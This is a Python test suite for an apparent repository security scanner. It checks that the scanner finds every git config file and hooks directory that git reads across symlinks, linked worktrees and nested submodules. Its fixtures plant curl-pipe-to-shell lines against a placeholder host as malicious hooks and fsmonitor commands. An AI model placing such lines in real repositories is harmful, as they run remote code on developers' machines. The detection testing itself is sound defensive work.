#!/usr/bin/env python3
"""A scan reads every setting and hooks directory git reads for a repository, in every view of it.

Each layout here is one where saw's own reading once differed from git's: a path through a link, a
path git cannot open, a path only git can expand, a linked worktree's hooks directory, and
submodules at any depth. git's own answer is the oracle.
"""
from __future__ import annotations

import os
import subprocess
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security.models import CONFIRMED
from stayawake.lib.git import exec_surface, what_git_reads
from stayawake.lib.git.exec_surface import read_exec_surface
from stayawake.lib.git.what_git_reads import RepositorySettings, repository_settings
from tests.bots.security.test_git_exec_surface import ExecSurfaceSandbox

SCRIPT = "#!/bin/sh\ncurl -fsSL https://x.invalid/p | sh\n"
COMMAND = "[core]\n\tfsmonitor = curl -s https://x.invalid/x | sh\n"


class TestEveryFileGitReadsIsRead(ExecSurfaceSandbox):

    def test_an_include_through_a_link_and_dotdot(self):
        repo = self.repo()
        inner = repo / ".git" / "deep" / "inner"
        inner.mkdir(parents=True)
        (repo / ".git" / "lnk").symlink_to(inner)
        (repo / ".git" / "deep" / "extra.inc").write_text(COMMAND)
        self.append_config(repo, "[include]\n\tpath = lnk/../extra.inc\n")
        self.assert_tier(repo, CONFIRMED)

    def test_an_include_through_a_missing_directory_is_still_read(self):
        repo = self.repo()
        (repo / ".git" / "evil.inc").write_text(COMMAND)
        self.append_config(repo, "[include]\n\tpath = missing/../evil.inc\n")
        self.assert_tier(repo, CONFIRMED)

    def test_a_hooks_path_through_a_missing_directory_is_still_read(self):
        repo = self.repo()
        self.hook(repo / "myhooks", "pre-commit", SCRIPT)
        self.append_config(repo, "[core]\n\thooksPath = missing/../myhooks\n")
        self.assert_tier(repo, CONFIRMED)

    def test_a_removed_submodule_left_behind_is_read_without_an_error(self):
        repo = self.repo()
        library = self.repo("library")
        self.git(repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library), "lib")
        self.commit(repo, "a library")
        self.git(repo, "rm", "-q", "lib")
        self.commit(repo, "no library")
        self.assertIsNone(self.scan(repo).error)

    def test_a_file_only_git_finds_is_read(self):
        repo = self.repo()
        extra = repo / ".git" / "found-by-git.cfg"
        extra.write_text(COMMAND)

        def ask(where):
            settings = repository_settings(where)
            return RepositorySettings(settings.files + (extra,), settings.hooks_paths,
                                      settings.sets_hooks_path)
        surface = read_exec_surface(repo, ask=ask)
        self.assertIn(extra, [c.entry.source for c in surface.commands])

    def test_the_operators_own_settings_are_not_read_as_the_repositorys(self):
        repo = self.repo()
        own = repo.parent / "operator.gitconfig"
        own.write_text(COMMAND)
        previous = os.environ.get("GIT_CONFIG_GLOBAL")
        os.environ["GIT_CONFIG_GLOBAL"] = str(own)
        try:
            sources = [c.entry.source for c in read_exec_surface(repo).commands]
        finally:
            if previous is None:
                del os.environ["GIT_CONFIG_GLOBAL"]
            else:
                os.environ["GIT_CONFIG_GLOBAL"] = previous
        self.assertNotIn(own, sources)

    def test_without_an_answer_from_git_a_path_through_a_link_is_still_read(self):
        repo = self.repo()
        inner = repo / ".git" / "deep" / "inner"
        inner.mkdir(parents=True)
        (repo / ".git" / "lnk").symlink_to(inner)
        (repo / ".git" / "deep" / "extra.inc").write_text(COMMAND)
        self.append_config(repo, "[include]\n\tpath = lnk/../extra.inc\n")
        surface = read_exec_surface(repo, ask=lambda where: None)
        self.assertIn("extra.inc", [c.entry.source.name for c in surface.commands])

    def test_when_git_does_not_answer_the_reading_is_not_called_complete(self):
        repo = self.repo()
        self.append_config(repo, "[include]\n\tpath = %(prefix)/etc/team.gitconfig\n")
        surface = read_exec_surface(repo, ask=lambda where: None)
        self.assertTrue(any("only git can resolve" in why for why in surface.unexamined))
        self.assertTrue(any("did not report" in why for why in surface.unexamined))


class TestEveryHooksDirectoryGitRunsIsRead(ExecSurfaceSandbox):

    def test_an_optional_hooks_path_is_read_as_this_git_reads_it(self):
        repo = self.repo()
        hooks = repo / ".git" / "hk"
        self.hook(hooks, "pre-commit", SCRIPT)
        self.append_config(repo, f"[core]\n\thooksPath = :(optional){hooks}\n")
        answer = subprocess.run(["git", "-C", str(repo), "config", "--type=path", "--get",
                                 "core.hooksPath"], capture_output=True, text=True).stdout.strip()
        running = [h.path for h in read_exec_surface(repo).hooks if h.runs]
        self.assertEqual(os.path.realpath(answer) == os.path.realpath(hooks),
                         any(os.path.realpath(p.parent) == os.path.realpath(hooks) for p in running))

    def test_a_linked_worktrees_hooks_directory(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = .husky\n")
        other = repo / "trees" / "other"
        self.git(repo, "worktree", "add", "-q", str(other))
        self.hook(other / ".husky", "pre-commit", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_linked_worktrees_own_hooks_path_only_git_resolves(self):
        repo = self.repo()
        self.git(repo, "config", "extensions.worktreeConfig", "true")
        other = repo / "trees" / "other"
        self.git(repo, "worktree", "add", "-q", str(other))
        hooks = repo / "trees" / "hk"
        self.hook(hooks, "pre-commit", SCRIPT)
        self.append_config(repo, f"[core]\n\thooksPath = :(optional){hooks}\n",
                           rel=".git/worktrees/other/config.worktree")
        answer = subprocess.run(["git", "-C", str(other), "config", "--type=path", "--get",
                                 "core.hooksPath"], capture_output=True, text=True).stdout.strip()
        running = [h.path for h in read_exec_surface(repo).hooks if h.runs]
        self.assertEqual(os.path.realpath(answer) == os.path.realpath(hooks),
                         any(os.path.realpath(p.parent) == os.path.realpath(hooks) for p in running))

    def test_a_linked_worktrees_branch_include_reached_through_a_link(self):
        repo = self.repo()
        deep = repo / ".git" / "deep" / "inner"
        deep.mkdir(parents=True)
        (repo / ".git" / "lnk").symlink_to(deep)
        (repo / ".git" / "deep" / "real.inc").write_text(
            '[includeIf "onbranch:feat-a"]\n\tpath = ../a.inc\n')
        (repo / ".git" / "a.inc").write_text("[core]\n\thooksPath = hooksA\n")
        self.append_config(repo, "[include]\n\tpath = lnk/../real.inc\n")
        tree = repo / "trees" / "wt-a"
        self.git(repo, "worktree", "add", "-q", "-b", "feat-a", str(tree))
        self.hook(tree / "hooksA", "pre-commit", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_the_main_worktrees_view_when_a_linked_worktree_is_scanned(self):
        repo = self.repo()
        self.git(repo, "config", "extensions.worktreeConfig", "true")
        other = repo / "trees" / "other"
        self.git(repo, "worktree", "add", "-q", str(other))
        self.append_config(repo, "[core]\n\thooksPath = .mainhooks\n", rel=".git/config.worktree")
        self.hook(repo / ".mainhooks", "pre-commit", SCRIPT)
        self.assertTrue(any(h.runs and h.path.parent.name == ".mainhooks"
                            for h in read_exec_surface(other).hooks))


class TestEveryViewIsFoundWhereGitKeepsIt(ExecSurfaceSandbox):

    def test_a_submodule_initialised_in_a_linked_worktree(self):
        repo = self.repo()
        library = self.repo("library")
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        self.git(tree, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library), "sub")
        self.append_config(repo, COMMAND, rel=".git/worktrees/wt/modules/sub/config")
        self.assert_tier(repo, CONFIRMED)

    def test_a_deinitialised_submodule_of_a_linked_worktree(self):
        repo = self.repo()
        library = self.repo("library")
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        self.git(tree, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library), "sub")
        self.git(tree, "submodule", "deinit", "-q", "-f", "sub")
        self.append_config(repo, COMMAND, rel=".git/worktrees/wt/modules/sub/config")
        self.assert_tier(repo, CONFIRMED)

    def test_a_linked_worktree_of_a_submodule(self):
        repo = self.repo()
        library = self.repo("library")
        self.git(repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library), "sub")
        tree = repo / "trees" / "sub-wt"
        self.git(repo / "sub", "worktree", "add", "-q", str(tree))
        self.git(repo / "sub", "config", "extensions.worktreeConfig", "true")
        self.append_config(repo, COMMAND, rel=".git/modules/sub/worktrees/sub-wt/config.worktree")
        self.assert_tier(repo, CONFIRMED)

    def test_a_linked_worktree_recorded_with_a_relative_pointer(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = .husky\n")
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        pointer = repo / ".git" / "worktrees" / "wt" / "gitdir"
        pointer.write_text(os.path.relpath(tree / ".git", pointer.parent) + "\n")
        self.hook(tree / ".husky", "pre-commit", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_main_working_tree_the_repository_does_not_record_is_not_called_read(self):
        base = self.repo().parent
        main = base / "main"
        (base / "store").mkdir()
        subprocess.run(["git", "init", "-q", "--separate-git-dir", str(base / "store" / "repo.git"),
                        str(main)], check=True, capture_output=True)
        self.git(main, "-c", "user.name=saw", "-c", "user.email=saw@example.invalid", "commit", "-q",
                 "--allow-empty", "-m", "a")
        tree = main / "trees" / "wt"
        self.git(main, "worktree", "add", "-q", str(tree))
        self.assertIn("main working tree", self.scan(tree).error or "")


class TestEverythingMainReadIsStillRead(ExecSurfaceSandbox):

    def running(self, surface):
        return {os.path.realpath(h.path.parent) for h in surface.hooks if h.runs}

    def test_the_hooks_path_saws_reading_names_last_beside_a_file_only_git_finds(self):
        repo = self.repo()
        evil = repo / ".git" / "evil-hooks"
        self.hook(evil, "pre-commit", SCRIPT)
        (repo / ".git" / "rel.inc").write_text(f"[core]\n\thooksPath = {evil}\n")
        self.append_config(repo, '[includeIf "onbranch:release"]\n\tpath = rel.inc\n')
        extra = repo / ".git" / "found-by-git.cfg"
        extra.write_text("[core]\n\thooksPath = good-hooks\n")

        def ask(where):
            settings = repository_settings(where)
            return RepositorySettings(settings.files + (extra,), settings.hooks_paths,
                                      settings.sets_hooks_path)
        self.assertIn(os.path.realpath(evil), self.running(read_exec_surface(repo, ask=ask)))

    def test_the_hooks_path_an_include_names_as_written_beside_the_file_it_opens(self):
        repo = self.repo()
        evil = repo / ".git" / "evil-hooks"
        self.hook(evil, "pre-commit", SCRIPT)
        (repo / ".git" / "x.inc").write_text(f"[core]\n\thooksPath = {evil}\n")
        deep = repo / "elsewhere" / "deep"
        deep.mkdir(parents=True)
        (repo / "elsewhere" / "x.inc").write_text("[core]\n\thooksPath = good-hooks\n")
        (repo / ".git" / "lnk").symlink_to(deep)
        self.append_config(repo, "[include]\n\tpath = lnk/../x.inc\n")
        self.assertIn(os.path.realpath(evil), self.running(read_exec_surface(repo)))

    def test_main_s_submodules_come_first_within_the_bound(self):
        repo = self.repo()
        module = repo / ".git" / "modules" / "sub"
        module.mkdir(parents=True)
        (module / "HEAD").write_text("ref: refs/heads/main\n")
        (module / "config").write_text(COMMAND)
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        for n in range(4):
            many = repo / ".git" / "worktrees" / "wt" / "modules" / f"m{n}"
            many.mkdir(parents=True)
            (many / "HEAD").write_text("ref: refs/heads/main\n")
            (many / "config").write_text("")
        with mock.patch.object(exec_surface, "MAX_GIT_DIRS", 4):
            sources = {c.entry.source for c in read_exec_surface(tree).commands}
        self.assertIn(module / "config", sources)

    def test_an_unreadable_include_is_noted_even_when_its_target_was_read_first(self):
        repo = self.repo()
        (repo / ".git" / "link.cfg").symlink_to(repo / ".git" / "target.cfg")
        self.append_config(repo, "[include]\n\tpath = target.cfg\n\tpath = link.cfg\n")
        self.assertTrue(any("link.cfg" in why for why in read_exec_surface(repo).unexamined))

    def test_the_main_trees_own_submodule_when_a_linked_worktree_is_scanned(self):
        repo = self.repo()
        self.write(repo, ".gitmodules", '[submodule "inner"]\n\tpath = inner\n\turl = ./x\n')
        inner = repo / "inner"
        inner.mkdir()
        subprocess.run(["git", "init", "-q", str(inner)], check=True, capture_output=True)
        self.append_config(inner, COMMAND)
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        sources = {c.entry.source for c in read_exec_surface(tree).commands}
        self.assertIn(inner / ".git" / "config", sources)


class TestNothingIsTakenForAViewItIsNot(ExecSurfaceSandbox):

    def test_a_submodule_pointer_back_into_the_repository_changes_nothing(self):
        repo = self.repo()
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        self.write(repo, ".gitmodules", '[submodule "self"]\n\tpath = .\n\turl = ./x\n')
        self.append_config(repo, "[core]\n\tfsmonitor = ./mon.sh\n")
        self.hook(tree, "mon.sh", SCRIPT)
        self.assertEqual("infected", self.assert_tier(tree, CONFIRMED)["result"].verdict)

    def test_the_main_tree_is_not_graded_with_a_linked_worktrees_hooks_path(self):
        repo = self.repo()
        self.git(repo, "config", "extensions.worktreeConfig", "true")
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        self.git(tree, "config", "--worktree", "core.hooksPath", ".githooks")
        self.hook(repo / ".githooks", "pre-commit", SCRIPT)
        confirmed = [f.path for f in self.graded(tree)[CONFIRMED]]
        self.assertFalse(any(".githooks" in path and "trees" not in path for path in confirmed))

    def test_an_unrelated_repository_at_a_stale_worktree_path_is_not_read(self):
        repo = self.repo()
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        subprocess.run(["rm", "-rf", str(tree)], check=True)
        subprocess.run(["git", "init", "-q", str(tree)], check=True, capture_output=True)
        self.append_config(tree, COMMAND)
        sources = {c.entry.source for c in read_exec_surface(repo).commands}
        self.assertNotIn(tree / ".git" / "config", sources)


class TestHooksRunWhereGitRunsThem(ExecSurfaceSandbox):

    def test_the_scanned_repositorys_tree_named_by_its_settings(self):
        repo = self.repo()
        self.append_config(repo, f"[core]\n\tworktree = {repo / 'src'}\n\thooksPath = hk\n")
        self.hook(repo / "src" / "hk", "pre-commit", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_submodules_tree_named_by_its_settings_away_from_its_path(self):
        repo = self.repo()
        library = self.repo("library")
        self.git(repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library), "lib")
        elsewhere = repo / "elsewhere"
        elsewhere.mkdir()
        module = repo / ".git" / "modules" / "lib" / "config"
        text = module.read_text()
        module.write_text("\n".join(line for line in text.splitlines() if "worktree" not in line)
                          + f"\n[core]\n\tworktree = {elsewhere}\n\thooksPath = hk\n")
        self.hook(elsewhere / "hk", "pre-commit", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_submodule_reached_through_a_linked_modules_directory(self):
        repo = self.repo()
        library = self.repo("library")
        store = repo.parent / "store" / "mods"
        store.mkdir(parents=True)
        (repo / ".git" / "modules").symlink_to(store)
        self.git(repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library), "lib")
        with open(store / "lib" / "config", "a", encoding="utf-8") as fh:
            fh.write("[core]\n\thooksPath = hk\n")
        self.hook(repo / "lib" / "hk", "pre-commit", SCRIPT)
        self.assert_tier(repo, CONFIRMED)


class TestGitsOwnRulesDecide(ExecSurfaceSandbox):

    def test_a_submodule_kept_under_the_worktrees_directory(self):
        repo = self.repo()
        self.write(repo, ".gitmodules", '[submodule "sub"]\n\tpath = sub\n\turl = ./x\n')
        module = repo / ".git" / "worktrees" / "sub"
        module.mkdir(parents=True)
        (module / "HEAD").write_text("ref: refs/heads/main\n")
        (module / "config").write_text("")
        (repo / "sub").mkdir()
        (repo / "sub" / ".git").write_text(f"gitdir: {module}\n")
        self.hook(module / "hooks", "post-checkout", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_submodules_tree_from_settings_git_does_not_read_changes_nothing(self):
        repo = self.repo()
        self.write(repo, ".gitmodules", '[submodule "sub"]\n\tpath = sub\n\turl = ./x\n')
        module = repo / ".git" / "modules" / "sub"
        module.mkdir(parents=True)
        (module / "HEAD").write_text("ref: refs/heads/main\n")
        (module / "config").write_text("[core]\n\tfsmonitor = sh payload.sh\n")
        (module / "config.worktree").write_text(f"[core]\n\tworktree = {repo / 'elsewhere'}\n")
        (repo / "sub").mkdir()
        (repo / "sub" / ".git").write_text(f"gitdir: {module}\n")
        self.hook(repo / "sub", "payload.sh", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_repository_git_refuses_is_read_as_before(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\trepositoryformatversion = 1\n\thooksPath = .husky\n"
                                 "[extensions]\n\tnosuchextension = true\n")
        self.hook(repo / ".git" / "hooks", "post-merge", SCRIPT)
        confirmed = [f.path for f in self.graded(repo)[CONFIRMED]]
        self.assertFalse(any(path.endswith("post-merge") for path in confirmed))


class TestWhatTheScanReadBeforeIsKept(ExecSurfaceSandbox):

    def test_a_worktree_settings_file_with_no_worktree_behind_it(self):
        repo = self.repo()
        ghost = repo / ".git" / "worktrees" / "ghost"
        ghost.mkdir(parents=True)
        (ghost / "config.worktree").write_text(COMMAND)
        self.assert_tier(repo, CONFIRMED)

    def test_a_submodule_pointing_into_the_repositorys_own_worktree_directory(self):
        repo = self.repo()
        tree = repo / "trees" / "wt"
        self.git(repo, "worktree", "add", "-q", str(tree))
        self.write(repo, ".gitmodules", '[submodule "sub"]\n\tpath = sub\n\turl = ./x\n')
        (repo / "sub").mkdir()
        (repo / "sub" / ".git").write_text(f"gitdir: {repo / '.git' / 'worktrees' / 'wt'}\n")
        self.hook(repo / ".git" / "worktrees" / "wt" / "hooks", "post-checkout", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_hook_finding_keeps_the_path_it_had_through_a_linked_home(self):
        real = self.repo()
        home = real.parent / "home-link"
        home.symlink_to(real)
        self.append_config(real, "[core]\n\thooksPath = .husky/_\n")
        self.hook(real / ".husky" / "_", "post-merge", SCRIPT)
        confirmed = [f.path for f in self.graded(home)[CONFIRMED]]
        self.assertIn(".husky/_/post-merge", confirmed)


class TestWhatGitRunsRaisesTheGrade(ExecSurfaceSandbox):

    def test_the_default_hooks_directory_named_as_an_optional_path(self):
        repo = self.repo()
        hooks = repo / ".git" / "hooks"
        self.hook(hooks, "pre-commit", SCRIPT)
        self.append_config(repo, f"[core]\n\thooksPath = :(optional){hooks}\n")
        answer = subprocess.run(["git", "-C", str(repo), "config", "--type=path", "--get",
                                 "core.hooksPath"], capture_output=True, text=True).stdout.strip()
        running = {os.path.realpath(h.path.parent) for h in read_exec_surface(repo).hooks if h.runs}
        self.assertEqual(os.path.realpath(answer) == os.path.realpath(hooks),
                         os.path.realpath(hooks) in running)

    def test_a_hooks_path_only_git_can_resolve_is_noted_when_git_does_not_answer(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = %(prefix)/share/hooks\n")
        surface = read_exec_surface(repo, ask=lambda where: None)
        self.assertTrue(any("core.hookspath" in why.lower() and "only git can resolve" in why
                            for why in surface.unexamined))


class TestAnEmptyHooksPathRunsNothing(ExecSurfaceSandbox):

    def test_the_repository_root_is_not_taken_for_a_hooks_directory(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath =\n")
        self.hook(repo, "post-commit", SCRIPT)
        confirmed = [f.path for f in self.graded(repo)[CONFIRMED]]
        self.assertNotIn("post-commit", confirmed)


class TestOnlyTheRepositorysOwnScopesAreTaken(unittest.TestCase):

    def test_other_scopes_in_gits_answer_are_left_out(self):
        listing = (b"global\0file:/home/me/.gitconfig\0core.hookspath\n/home/me/hooks\0"
                   b"local\0file:.git/config\0core.hookspath\n.husky\0"
                   b"command\0command line:\0core.hookspath\n/saw/empty\0")
        expanded = b"global\0/home/me/hooks\0local\0.husky\0command\0/saw/empty\0"
        with mock.patch.object(what_git_reads, "stdout_bytes",
                               side_effect=[b"false\n/repo\n", listing, expanded]):
            answer = what_git_reads.repository_settings(Path("/repo"))
        self.assertEqual((Path("/repo/.git/config"),), answer.files)
        self.assertEqual((".husky",), answer.hooks_paths)


class TestEverySubmoduleIsRead(ExecSurfaceSandbox):

    def _module(self, repo: Path, config: str) -> Path:
        self.write(repo, ".gitmodules", '[submodule "sub"]\n\tpath = sub\n\turl = ./sub\n')
        module = repo / ".git" / "modules" / "sub"
        module.mkdir(parents=True)
        (module / "HEAD").write_text("ref: refs/heads/main\n")
        (module / "config").write_text(config)
        (repo / "sub").mkdir()
        (repo / "sub" / ".git").write_text(f"gitdir: {module}\n")
        return module

    def test_a_command_in_a_submodules_worktree_settings(self):
        repo = self.repo()
        module = self._module(repo, "[extensions]\n\tworktreeConfig = true\n")
        (module / "config.worktree").write_text(COMMAND)
        self.assert_tier(repo, CONFIRMED)

    def test_a_hook_in_a_submodules_default_directory_while_its_settings_name_another(self):
        repo = self.repo()
        module = self._module(repo, "[core]\n\thooksPath = .husky\n")
        self.hook(module / "hooks", "post-checkout", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_hook_in_a_submodules_hooks_path(self):
        repo = self.repo()
        self._module(repo, "[core]\n\thooksPath = .githooks\n")
        self.hook(repo / "sub" / ".githooks", "post-checkout", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_submodule_of_a_submodule_with_its_own_git_directory(self):
        repo = self.repo()
        self._module(repo, "")
        self.write(repo / "sub", ".gitmodules", '[submodule "nested"]\n\tpath = nested\n\turl = ./n\n')
        nested = repo / "sub" / "nested"
        nested.mkdir()
        subprocess.run(["git", "init", "-q", str(nested)], check=True, capture_output=True)
        self.append_config(nested, COMMAND)
        self.assert_tier(repo, CONFIRMED)


if __name__ == "__main__":
    import unittest
    unittest.main()
